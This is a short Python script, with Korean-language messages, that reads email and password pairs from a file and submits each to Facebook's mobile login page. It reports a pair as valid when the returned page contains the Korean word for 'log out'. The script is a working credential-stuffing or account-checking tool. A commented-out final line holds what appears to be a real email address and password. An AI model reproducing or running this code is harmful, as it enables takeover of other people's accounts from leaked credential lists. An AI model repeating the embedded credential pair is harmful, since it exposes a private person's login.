import os
from os import read
try:    
    import requests
except:
    print('\033[31m' + 'requests module이 설치되어있지 않습니다.' + '\033[0m') 


def attempt(uid : str, upw : str) -> str:
    WebrequestSession = requests.Session()

    LoginData = {
        'email':uid,
        'pass':upw,
        'form':'login'
    }

    Connectresponse = WebrequestSession.post('https://m.facebook.com/login/?ref=dbl&fl',data = LoginData).text
    
    WebrequestSession.close()

    if Connectresponse.find("로그아웃") > 0:
        return "[+] User Existence"

    else:
        return "[-] User None"

def readattempt(FileName : str) -> list:
    if os.path.isfile(FileName):

        openfile = open(FileName, 'r', encoding='UTF-8')
        readfile = [i.strip('\n') for i in openfile.readlines()]

        Check = []

        for i in range(0,len(readfile)):
            dictread = {
                'uid' : readfile[i].split()[0],
                'upw' : readfile[i].split()[1]
            }
            ConnectCheck = attempt(dictread['uid'],dictread['upw'])

            print(ConnectCheck,'uid :',dictread['uid'],'upw :',dictread['upw'])
            Check.append(ConnectCheck)

        return Check

    else:
        print('해당 위치에 파일이 존재하지않습니다.')

for i in readattempt('login.txt'):
    print(i)


#print(attempt('flfld76@naver.com','sbc204292+'))